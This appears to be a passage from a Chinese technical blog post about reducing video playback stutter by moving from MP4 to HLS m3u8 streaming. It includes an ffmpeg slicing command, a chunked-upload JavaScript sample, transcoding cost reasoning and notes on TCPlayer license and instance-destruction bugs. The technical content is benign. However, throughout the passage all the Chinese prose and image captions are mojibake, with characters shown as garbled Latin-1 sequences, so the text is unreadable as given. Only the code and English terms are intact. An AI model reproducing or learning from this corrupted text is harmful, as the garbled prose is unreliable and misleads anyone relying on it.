<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e4b80c3ae7d40a894a57dd8654e2bcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=eSVYA%2B1WK2LCEfWxILxCjY%2B%2BDKc%3D" alt="è§†é¢‘è½¬æ¢å·¥å…·" loading="lazy"/></p>
<p>äºæ˜¯æˆ‘ä»¬æ¢³ç†äº†ä¸€ä¸‹è§„èŒƒæ–‡æ¡£ï¼Œè®©ä¸Šé—¨ä¸šåŠ¡æŒ‰ç…§è¿™ä¸ªæ–¹æ³•æ¥å‡è½»è§†é¢‘æ’­æ”¾çš„å¡é¡¿ã€‚ä¸Šé—¨ä¸šåŠ¡ç”¨äº†è¿™å¥—è§„èŒƒä¹‹åï¼Œèƒ½å¤Ÿå¤§ç¨‹åº¦å‡å°‘ä»–ä»¬å­¦ä¹ çš„å¡é¡¿é—®é¢˜ï¼Œåé¢åé¦ˆçš„é¢‘ç‡ç›¸å¯¹æ¯”è¾ƒä½ã€‚</p>
<p>ä½†åˆ°åæ¥ï¼Œå…¶ä»–ä¸šåŠ¡ä¹Ÿç”¨ä¸Šäº†è¯¥å¹³å°ï¼Œç”±äºè§„èŒƒæ–‡æ¡£å¾ˆéš¾æ‹‰é½ï¼Œä»–ä»¬å°±ä¼šæŒ‰ç…§è‡ªå·±çš„æ–¹å¼ç›´æ¥å°†è§†é¢‘ä¸Šä¼ äº†ï¼Œå¦‚æœè§†é¢‘æ¯”è¾ƒå¤§ï¼Œé‚£å®¹æ˜“å¯¼è‡´è§†é¢‘æ’­æ”¾å¡é¡¿ã€‚å³ä½¿æ‹‰é½äº†ï¼Œè¿˜æ˜¯æœ‰ä¸€å®šç¨‹åº¦çš„å¡é¡¿ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªæ–¹æ¡ˆé‡Œï¼Œå¸¦æ¥çš„ä¸€ä¸ªå¼Šç«¯å°±æ˜¯æ¯æ¬¡ä¸Šä¼ è§†é¢‘ä¹‹å‰éƒ½è¦å‹ç¼©ä¸€éï¼Œå¹¶ä¸”ä¹Ÿä¸èƒ½å®Œå…¨è§£å†³é—®é¢˜ï¼Œè¿™å¹¶ä¸æ˜¯å¤§å®¶æƒ³è¦çš„ä¸€ä¸ªç»“æœã€‚</p>
<h3 data-id="heading-5">3. ç²¾å¦™åº”ç”¨ï¼šé‡‡ç”¨ HLS æµåª’ä½“ç±»å‹æµç•…æ’­æ”¾</h3>
<p>ç»è¿‡å……åˆ†èµ„æ–™çš„è°ƒç ”ï¼Œå¹¶ä¸”è·Ÿä¸€äº›æ‡‚é¢†åŸŸçš„æŠ€æœ¯ä¼™ä¼´æ²Ÿé€šäº¤æµï¼Œä»–è¯´é“ï¼š"å¯ä»¥é‡‡ç”¨æµåª’ä½“æ–¹å¼æ’­æ”¾ï¼Œç°åœ¨å¾ˆå°‘äººç”¨ mp4 æ’­æ”¾äº†ï¼Œåˆ‡ç‰‡æ‰æ˜¯ç‹é“ã€‚"ï¼Œäºæ˜¯å†³å®šç”¨æµåª’ä½“æ–¹å¼æ’­æ”¾çœ‹çœ‹ã€‚</p>
<p>è¿™é‡Œæµåª’ä½“ä¸»è¦ç”¨çš„æ˜¯ m3u8 æ ¼å¼ï¼Œm3u8 æ˜¯ä¸€ç§åŸºäºæ–‡æœ¬çš„åª’ä½“æ’­æ”¾åˆ—è¡¨æ ¼å¼ï¼Œå¸¸ç”¨äºæµåª’ä½“ä¼ è¾“ã€‚å®ƒå¯ä»¥å°†è§†é¢‘åˆ‡ç‰‡æˆå¤šä¸ªå°çš„ .ts æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ m3u8 æ–‡ä»¶è¿›è¡Œç´¢å¼•å’Œæ§åˆ¶ã€‚m3u8 æ ¼å¼é€‚ç”¨äºå®æ—¶æµåª’ä½“ä¼ è¾“ï¼Œå¦‚ç›´æ’­ã€åœ¨çº¿è§†é¢‘ç­‰ï¼Œå¹¶å…·æœ‰è‡ªé€‚åº”ç ç‡ç‰¹æ€§ï¼Œå¯ä»¥æ ¹æ®ç½‘ç»œæ¡ä»¶åŠ¨æ€è°ƒæ•´è§†é¢‘çš„è´¨é‡ã€‚</p>
<p>æˆ‘ä»¬è¿™åšäº†ä¸ª Demo è¿›è¡Œå¯¹æ¯”ï¼Œè§†é¢‘æ—¶é•¿ 6 åˆ†é’Ÿå¤šï¼Œå¤§å° 290m å·¦å³ï¼ŒåŠ è½½é€Ÿåº¦å¯¹æ¯”å¦‚ä¸‹ï¼š</p>
<p>mp4 demoï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ad808bbccb64f27b6678ad1658105d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=zwLAEtWgaai35mHqygldWcPgw8o%3D" alt="mp4-demo.gif" loading="lazy"/></p>
<p>m3u8 demoï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0512468c44f84621a4ed7b840c76c861~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=EQlGMpkSR%2Fu90qqFqKPds%2FtPc1o%3D" alt="m3u8-demo.gif" loading="lazy"/></p>
<p>æ˜æ˜¾èƒ½æ„Ÿè§‰ä¸‹é¢çš„åˆ‡ç‰‡æ–¹å¼ï¼ŒåŠ è½½é€Ÿåº¦ä¼šç›¸å¯¹å¿«å¾ˆå¤šï¼Œè¿™ä¸ªæµ‹è¯•å¾—äºˆéªŒè¯ä¹‹åï¼Œå¼€å§‹è½å®æˆ‘ä»¬çš„ä¸šåŠ¡æŠ€æœ¯å®ç°ã€‚</p>
<p>ç›®å‰ç”¨çš„è§†é¢‘æ ¼å¼æ˜¯ mp4ï¼Œæˆ‘ä»¬æƒ³äº†å‡ ä¸ªå°† mp4 è½¬æˆ m3u8 æµåª’ä½“æ ¼å¼çš„æ–¹æ¡ˆã€‚</p>
<p>1ï¼‰<strong>é‡‡ç”¨è…¾è®¯äº‘è½¬ç æ¥å£</strong>ï¼šç”±äºæˆ‘ä»¬äº‘å‚¨å­˜éƒ½æ˜¯ç”¨çš„è…¾è®¯äº‘ï¼Œçœ‹èƒ½ä¸èƒ½ç›´æ¥ç”¨è…¾è®¯äº‘çš„æ¥å£ã€‚è…¾è®¯äº‘è½¬ç æ˜¯éœ€è¦æ”¶è´¹çš„ï¼ŒæŒ‰ç…§è§†é¢‘çš„é•¿åº¦æ¥ç®—ï¼Œæ¯”å¦‚ä¸€ä¸ªè§†é¢‘ 6 åˆ†é’Ÿï¼Œæ¯åˆ†é’Ÿæ”¶è´¹ 1 å—é’±ï¼Œé‚£ä¹ˆè½¬ç è¿™ä¸ªè§†é¢‘å°±éœ€è¦æ”¶èµ· 6 å—é’±çš„è´¹ç”¨ï¼Œä¸€å¤©ä¸Šä¼  20 ä¸ªè§†é¢‘çš„è¯ï¼Œä¸€å¤© 120 å…ƒï¼Œä¸€å¹´å°± 43800 å…ƒï¼Œè¿˜æ˜¯æœ‰ä¸€å®šæˆæœ¬çš„ï¼ŒåŸºäºè¿™ä¸ªè€ƒè™‘ï¼Œæš‚æ—¶å¾…å®šã€‚</p>
<p>2ï¼‰<strong>å‰ç«¯å®ç°æ–‡ä»¶è½¬ç æœåŠ¡</strong>ã€‚å¯ä»¥é‡‡ç”¨ FFmpeg å¯¹æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼ŒFFmpeg åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæä¾›äº†ä¸°å¯Œå‘½ä»¤å’Œæ–¹æ³•ï¼Œä»¥ä¸‹æ˜¯è¯¥å·¥å…·çš„ä¸»è¦åŠŸèƒ½ï¼š</p>
<ul>
<li>éŸ³é¢‘/è§†é¢‘ç¼–ç å’Œè§£ç ï¼šFFmpeg æ”¯æŒå¤šç§éŸ³é¢‘å’Œè§†é¢‘ç¼–ç æ ¼å¼ï¼Œå¯ä»¥è¿›è¡Œç¼–ç å’Œè§£ç æ“ä½œã€‚</li>
<li>è§†é¢‘è½¬ç å’Œæ ¼å¼è½¬æ¢ï¼šFFmpeg å¯ä»¥å°†ä¸€ä¸ªè§†é¢‘æ–‡ä»¶è½¬æ¢ä¸ºä¸åŒçš„æ ¼å¼ï¼Œå¦‚ä» MP4 è½¬æ¢ä¸º AVIã€FLVã€MKV ç­‰ã€‚</li>
<li>è§†é¢‘å‰ªè¾‘å’Œè£å‰ªï¼šFFmpeg å¯ä»¥å°†è§†é¢‘æ–‡ä»¶è¿›è¡Œå‰ªè¾‘ã€è£å‰ªå’Œæ‹¼æ¥ï¼Œå®ç°è§†é¢‘çš„ç¼–è¾‘å’Œåˆå¹¶ã€‚</li>
<li>å›¾ç‰‡å’Œè§†é¢‘å¤„ç†ï¼šFFmpeg å¯ä»¥ä»è§†é¢‘ä¸­æå–å¸§ï¼Œä¹Ÿå¯ä»¥å°†å¤šä¸ªå›¾ç‰‡åˆæˆä¸ºè§†é¢‘ã€‚</li>
<li>å½•åˆ¶å’Œè½¬æ’­ï¼šFFmpeg å¯ä»¥é€šè¿‡æ•è·éŸ³é¢‘å’Œè§†é¢‘è¾“å…¥è¿›è¡Œå®æ—¶å½•åˆ¶å’Œè½¬æ’­ã€‚</li>
<li>æµåª’ä½“ä¼ è¾“ï¼šFFmpeg æ”¯æŒå°†éŸ³é¢‘å’Œè§†é¢‘å®æ—¶ä¼ è¾“åˆ°ç½‘ç»œä¸­ï¼Œç”¨äºå®ç°æµåª’ä½“æœåŠ¡ã€‚</li>
<li>éŸ³é¢‘å’Œè§†é¢‘è¿‡æ»¤ï¼šFFmpeg æä¾›äº†ä¸°å¯Œçš„éŸ³é¢‘å’Œè§†é¢‘è¿‡æ»¤å™¨ï¼Œå¯ä»¥å®ç°é™å™ªã€å»æ°´å°ã€è°ƒæ•´äº®åº¦å¯¹æ¯”åº¦ç­‰åŠŸèƒ½ã€‚</li>
<li>åª’ä½“ä¿¡æ¯è§£æï¼šFFmpeg å¯ä»¥è§£æéŸ³é¢‘å’Œè§†é¢‘æ–‡ä»¶çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œå¦‚åˆ†è¾¨ç‡ã€ç¼–ç å™¨ã€ç ç‡ç­‰ã€‚</li>
</ul>
<p>è¿™åªæ˜¯ FFmpeg çš„ä¸€äº›ä¸»è¦åŠŸèƒ½ï¼Œå®ƒè¿˜æœ‰æ›´å¤šçš„ç”¨é€”å’ŒåŠŸèƒ½ï¼Œå¯æ ¹æ®å…·ä½“éœ€æ±‚è¿›è¡Œæ·±å…¥å­¦ä¹ å’Œä½¿ç”¨ã€‚</p>
<p>è¿™æ¥è®²ä¸‹å‰ç«¯ Node å¤§è‡´å®ç°æ€è·¯ï¼š</p>
<p>a. åç«¯å¯¹å‰ç«¯ä¸Šä¼ è¿‡æ¥çš„æ–‡ä»¶é€šè¿‡ FFmpeg åŒ…è¿›è¡Œå¤„ç†ï¼Œå°†å…¶è½¬æˆ m3u8 åŠ ts æ–‡ä»¶æ ¼å¼ï¼›</p>
<p>åº•å±‚å‘½ä»¤å®ç°å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">ffmpeg -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.mp4</span> -hls_time <span class="hljs-number">10</span> -hls_list_size <span class="hljs-number">0</span> -y output<span class="hljs-selector-class">.m3u8</span>
</code></pre>
<p>ç”Ÿæˆçš„æ–‡ä»¶åˆ‡ç‰‡ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/044be02f75db42278e7fe8fa61727b1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=KdFfkZLhXzuoB69GdVOCO6EguAY%3D" alt="m3u8åˆ‡ç‰‡" loading="lazy"/></p>
<p>b. ç„¶åå°†è¾“å‡ºçš„ m3u8 åŠ ts çš„ç›¸å…³æ–‡ä»¶ä¸Šä¼ åˆ°äº‘å‚¨å­˜é‡Œå»ï¼›</p>
<p>c. è¿”å› m3u8 åœ°å€ç»™å‰ç«¯ï¼›</p>
<p>ç»¼åˆè€ƒè™‘ï¼Œè¿™ä¸ªå®ç°æˆæœ¬æœ‰ç‚¹å¤§ï¼Œå¤„ç†ä¸å¥½çš„è¯ä¹Ÿå®¹æ˜“å‡ºé—®é¢˜ã€‚æƒ³ç€æ˜¯ä¸æ˜¯å¯ä»¥è®©æ¶æ„ç»„å®ç°ä¸€ä¸‹ï¼Œæ¯•ç«Ÿè¿™ä¸ªåŠŸèƒ½å…¶ä»–ä¸šåŠ¡ä¹Ÿä¼šç”¨åˆ°ï¼Œåº”è¯¥åšä¸ºé€šç”¨çš„æ¥å£ä¼šåˆé€‚ç‚¹ï¼Œä¸ç„¶å„è‡ªå¼€å‘è¿™ä¸ªæˆæœ¬ä¹ŸæŒºå¤§ï¼ŒåŸºäºè¿™ä¸ªè€ƒè™‘ï¼Œå‰ç«¯å®ç°æ–¹æ¡ˆå¾…å®šã€‚</p>
<p><strong>3ï¼‰äº¤ç”±æ¶æ„ç»„æ”¯æŒè§†é¢‘æ–‡ä»¶è½¬æ¢ m3u8 æ ¼å¼ã€‚</strong></p>
<p>ç¬¬ä¸€æ—¶é—´ä¸æ¶æ„ç»„çš„ç›¸å…³äººå‘˜æ²Ÿé€šä¸‹è¯‰æ±‚ï¼Œè®²äº†ä¸‹æˆ‘ä»¬çš„ç°çŠ¶å’Œè¯‰æ±‚åŠæ”¶ç›Šï¼Œçœ‹èƒ½å¦æ”¯æŒä¸€ä¸‹ã€‚åé¢æˆ‘ä»¬è·Ÿäº§å“æ‹‰äº†ä¸ªä¼šè®®ç®€å•æ²Ÿé€šäº†ä¸€ä¸‹ï¼Œæ¶æ„è´Ÿè´£äººè¡¨ç¤ºèƒ½å¤Ÿæ”¯æŒã€‚åœ¨ä¸æ¶æ„æ²Ÿé€šä¸­ç»™äº† 3 ç§æ–¹æ¡ˆç»™æˆ‘ä»¬é€‰æ‹©ï¼š</p>
<ul>
<li>å‰ç«¯è°ƒç”¨ sdk ä¸Šä¼ åå†è°ƒç”¨è½¬ç æ¥å£ï¼›ï¼ˆä¸Šä¼ æ—¶é•¿è¾ƒé•¿ï¼‰</li>
<li>å‰ç«¯ä¸Šä¼ åæ‰”ç»™åç«¯å¤„ç†åˆ†ç‰‡ä¸Šä¼ ï¼Œç„¶åå†è½¬ç æ¥å£ï¼›ï¼ˆå‹åŠ›ç»™åˆ°åç«¯ï¼‰</li>
<li>å‰ç«¯è°ƒç”¨åˆ†ç‰‡æ¥å£ä¸Šä¼ ï¼Œå®Œæˆåå†è°ƒè½¬ç æ¥å£ï¼ˆå‰ç«¯è°ƒç”¨ä¸Šä¼ åˆ†ç‰‡æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦è°ƒ 3 ä¸ªæ­¥éª¤æ¥å£ï¼Œå†è°ƒè½¬ç æ¥å£ï¼‰</li>
</ul>
<p>ä»£ç å®ç°æƒ…å†µå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//å‰ç«¯åˆ†ç‰‡ä¸Šä¼ </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">chunkFile</span>(<span class="hljs-params">file, chunkSize</span>) {
  <span class="hljs-keyword">const</span> fileSize = file.<span class="hljs-property">size</span>;
  <span class="hljs-keyword">let</span> offset = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">while</span> (offset &lt; fileSize) {
    <span class="hljs-keyword">const</span> chunk = file.<span class="hljs-title function_">slice</span>(offset, offset + chunkSize);
    <span class="hljs-title function_">uploadChunk</span>(chunk); <span class="hljs-comment">// ä¸Šä¼ å—åˆ°æœåŠ¡å™¨è¿›è¡Œå¤„ç†</span>

    offset += chunkSize;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">uploadChunk</span>(<span class="hljs-params">chunk</span>) {
  <span class="hljs-comment">// è¿™é‡Œä»…ä½œä¸ºç¤ºä¾‹ï¼Œä½ éœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œé€‚å½“ä¿®æ”¹</span>
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'chunk'</span>, chunk);

  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/upload'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: formData
  })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
      <span class="hljs-comment">// å¤„ç†å“åº”</span>
    })
    .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
      <span class="hljs-comment">// å¤„ç†é”™è¯¯</span>
    });
}

<span class="hljs-comment">// ç¤ºä¾‹ç”¨æ³•</span>
<span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'file-input'</span>);

fileInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">const</span> chunkSize = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// æ¯ä¸ªå—çš„å¤§å°ï¼ˆè¿™é‡Œè®¾ä¸º1MBï¼‰</span>

  <span class="hljs-title function_">chunkFile</span>(file, chunkSize);
});

</code></pre>
<p>åŸºäºè¿™ 3 ç§æ–¹æ¡ˆï¼Œè€ƒè™‘ç›®å‰ç®¡ç†ç«¯å¯¹ä¸Šä¼ æ—¶é•¿ä¹Ÿæ²¡å¤ªå¤§è¯‰æ±‚ã€‚æˆ‘ä»¬å°±é€‰æ‹©ç®€å•ä¸€ç‚¹ï¼Œäºæ˜¯é€‰æ‹©ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œåˆ†ç‰‡çš„æ–¹æ¡ˆå¯ä»¥å…ˆå®ç°ï¼Œåç»­ä¸šåŠ¡å¯¹è¿™å—æœ‰ç—›ç‚¹çš„è¯ï¼Œæˆ‘ä»¬å†åˆ‡æ¢æˆåˆ†ç‰‡ä¸Šä¼ çš„å½¢å¼ï¼Œæœ€ç»ˆé‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯ï¼šåˆ‡æ¢è…¾è®¯ TCPlayer æ’­æ”¾å™¨+æµåª’ä½“æ ¼å¼æ’­æ”¾ï¼Œè¿™ä¸ªå¡é¡¿é—®é¢˜å¾—äºˆè§£å†³ã€‚</p>
<p>æœ€ç»ˆå‘ˆç°æ•ˆæœå›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a7751778bc5479dbf9b945e935dae7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=Kb652mNum89aYDofx8xTFZ0vRgY%3D" alt="è§†é¢‘æ’­æ”¾æ ·å¼æ•ˆæœ" loading="lazy"/></p>
<h2 data-id="heading-6">æŠ€æœ¯éš¾ç–‘</h2>
<p>è¿™é‡Œä¸»è¦æ˜¯ä½¿ç”¨ TCPlayer æ’­æ”¾æµåª’ä½“æ ¼å¼çš„åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œè®°å½•ä¸‹æ¥æ–¹ä¾¿ç»™åç»­ä½¿ç”¨çš„äººé¿å…è¸©å‘ã€‚</p>
<ol>
<li>æç¤º lack license url é”™è¯¯ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/073f49f1a802474a8861dd0e0e0a5636~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=ydWS8qgFq0ue9RvWyDi%2FsJWF9CM%3D" alt="licenseæŠ¥é”™" loading="lazy"/></p>
<p>web æ’­æ”¾å™¨åŸºç¡€ç‰ˆæ˜¯å…è´¹çš„ï¼Œéœ€è¦ç”³è¯·ä¸‹ license æ‰è¡Œï¼Œæ¯æ¬¡ä¸€å¹´çš„æœŸé™ï¼Œè¿‡æœŸåéœ€è¦è‡ªè¡Œç»­æœŸã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ed9cff87ec8480eb89ab409c65cc4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=T3bW6NKouHHJZa%2B2ailfvBarzRQ%3D" alt="æ’­æ”¾å™¨æ–‡æ¡£" loading="lazy"/></p>
<ol start="2">
<li>æ§åˆ¶å°ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œä½†è¿™å¹¶ä¸ä¼šå¯¹åŠŸèƒ½çš„æ­£å¸¸ä½¿ç”¨é€ æˆå½±å“ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå»ºè®®å‡çº§ tcplayer.js åˆ° 5.1.0 ç‰ˆæœ¬ã€‚è¿™ä¸ªæ›´æ–°ç‰ˆæœ¬èƒ½å¤Ÿæœ‰æ•ˆè§£å†³è¯¥é”™è¯¯ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9c594e776e434d835fdcff8f39bb30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=YwE95YgCT1hkGlPhYO4h0HHp4wc%3D" alt="æ’­æ”¾å™¨æŠ¥é”™" loading="lazy"/></p>
<ol start="3">
<li>åœ¨å¤šä¸ªè§†é¢‘åˆ†é¡µåˆ‡æ¢æ—¶ï¼Œæˆ‘å‘ç°ä¸€ä¸ªåˆå§‹åŒ–çš„é—®é¢˜ã€‚åœ¨ç‚¹å‡»ä¸‹ä¸€é¡µä¹‹å‰ï¼Œæˆ‘ä¼šé”€æ¯æ‰€æœ‰çš„è…¾è®¯äº‘æ’­æ”¾å™¨å®ä¾‹ã€‚ç„¶è€Œï¼Œå½“åˆ‡æ¢åˆ°ä¸‹ä¸€é¡µæ—¶ï¼Œä½¿ç”¨åŒä¸€ä¸ªè§†é¢‘æ ‡ç­¾çš„è§†é¢‘ä¹Ÿä¼šè¢«ç§»é™¤ï¼Œç»“æœå¯¼è‡´ä¸‹ä¸€ä¸ªè§†é¢‘æ¶ˆå¤±äº†ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3416c53c5cb340588a067e0690fc7ac1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=F4hMhALnFlMus2qvmnQGci5G5uc%3D" alt="æ§åˆ¶å°" loading="lazy"/></p>
<br/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73f7d918447c4308b128840351693def~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=x0HBHAnAtKh8m53T0iKWoYHIEqw%3D" alt="æ§åˆ¶å°" loading="lazy"/></p>
<p>ç»è¿‡ä¸è…¾è®¯å‰ç«¯æŠ€æœ¯æ²Ÿé€šåï¼Œå¯èƒ½å¯¹æˆ‘ä»¬çš„ä¸šåŠ¡ä¸å¤ªäº†è§£ï¼Œæ²¡æ³•æƒ³è±¡å‡ºé—®é¢˜æ˜¯å’‹æ ·çš„ã€‚å¯¹æ­¤ä»–ä»¬ä¹Ÿæ²¡æœ‰ç»™å‡ºæ˜ç¡®çš„è§£å†³å»ºè®®ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†³å®šè‡ªè¡Œå¤„ç†è¯¥é€»è¾‘ã€‚åœ¨ç»è¿‡ä¸€ç•ªæ€è€ƒåï¼Œæˆ‘æ„è¯†åˆ°æ¨¡æ¿æ²¡æœ‰é‡æ–°æ¸²æŸ“æ˜¯ä¸€ä¸ªå¯èƒ½å¯¼è‡´é—®é¢˜çš„åŸå› ã€‚äºæ˜¯ç¬¬äºŒå¤©ï¼Œæˆ‘å°è¯•äº†å¦å¤–ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œåœ¨åˆ‡æ¢é¡µç æ—¶ï¼Œå¼ºåˆ¶å°† v-if åˆ¤æ–­è¯­å¥è®¾ä¸º falseï¼Œç„¶ååœ¨è·å–åˆ°æ•°æ®åå†å°†å…¶è®¾ä¸º trueã€‚ç»“æœå‡ºä¹æ„æ–™åœ°æˆåŠŸäº†ï¼è¿™æ ·ä¸€æ¥ï¼Œæ¨¡æ¿å¾—ä»¥é‡æ–°æ¸²æŸ“ï¼Œé—®é¢˜ä¹Ÿå¾—åˆ°äº†è§£å†³ã€‚æ ¸å¿ƒé—®é¢˜å°±æ˜¯ç›¸åŒåœ°å€çš„è§†é¢‘é‡‡ç”¨çš„ id å€¼å¯¼è‡´æ’­æ”¾å™¨å®ä¾‹é‡å¤äº†ï¼Œé”€æ¯åå…¶å…¶ä»–ç›¸åŒåœ°å€ id çš„è§†é¢‘ä¹Ÿè¢«é”€æ¯äº†ï¼Œæ‰€ä»¥éœ€è¦æ¯æ¬¡åˆ‡æ¢é¡µç çš„æ—¶å€™éƒ½è¦æ¸²æŸ“æ¨¡ç‰ˆæ‰èƒ½åŠ è½½æˆåŠŸã€‚</p>
<h2 data-id="heading-7">æœ€å</h2>
<p>ä¸Šçº¿æ—¶éš”ä¸€å¹´ï¼Œå„ä¸šåŠ¡éƒ¨é—¨å†ä¹Ÿæ²¡æœ‰åé¦ˆè¿‡è§†é¢‘å¡é¡¿çš„é—®é¢˜ã€‚è¿™ä¸€æ”¹è¿›è¿‡ç¨‹ä¸­å¾—åˆ°äº†ä¸šåŠ¡åé¦ˆçš„ç§¯æå›åº”ï¼Œè¡¨ç¤ºè§†é¢‘åŠ è½½é€Ÿåº¦æ˜¾è‘—æå‡ï¼Œè§†é¢‘ä½“éªŒæ›´åŠ é¡ºç•…ã€‚</p>
<p>è¿‡å»ï¼Œç”¨æˆ·åœ¨åŠ è½½è§†é¢‘æ—¶å¸¸å¸¸é‡åˆ° 3-5 ç§’ç”šè‡³æ›´é•¿çš„ç­‰å¾…æ—¶é—´ï¼Œç»™è§‚çœ‹ä½“éªŒå¸¦æ¥äº†å›°æ‰°ã€‚ç°åœ¨ï¼Œåˆ‡æ¢åŠ è½½é€Ÿåº¦æå¤§æå‡ï¼Œä»…éœ€ä¸åˆ° 1 ç§’çš„æ—¶é—´å³å¯åŠ è½½å®Œæˆã€‚é€šè¿‡ä»¥ä¸Šæ–¹æ¡ˆçš„è°ƒç ”åŠæµ‹è¯•ï¼Œæˆ‘ä»¬æˆåŠŸæ¶ˆé™¤äº†è§†é¢‘æ’­æ”¾å¡é¡¿çš„é—®é¢˜ï¼Œå¤§å¤§æå‡äº†ç”¨æˆ·çš„è§‚çœ‹ä½“éªŒï¼Œåç»­å°†æŒç»­å…³æ³¨å¹¶ä¼˜åŒ–è§†é¢‘æ’­æ”¾ï¼Œä»¥ç¡®ä¿ç”¨æˆ·èƒ½å¤Ÿäº«å—åˆ°æœ€ä½³çš„è§‚çœ‹ä½“éªŒã€‚</p>
<p>PSï¼šå¦‚æœæ‚¨æœ‰æ›´å¥½çš„å®ç°æ–¹å¼æˆ–è€…ç–‘é—®ï¼Œæ¬¢è¿åœ¨åº•éƒ¨ç•™è¨€æ¢è®¨ã€‚</p>
<blockquote>
<p>è½¬è½¬ç ”å‘ä¸­å¿ƒåŠä¸šç•Œå°ä¼™ä¼´ä»¬çš„æŠ€æœ¯å­¦ä¹ äº¤æµå¹³å°ï¼Œå®šæœŸåˆ†äº«ä¸€çº¿çš„å®æˆ˜ç»éªŒåŠä¸šç•Œå‰æ²¿çš„æŠ€æœ¯è¯é¢˜ã€‚
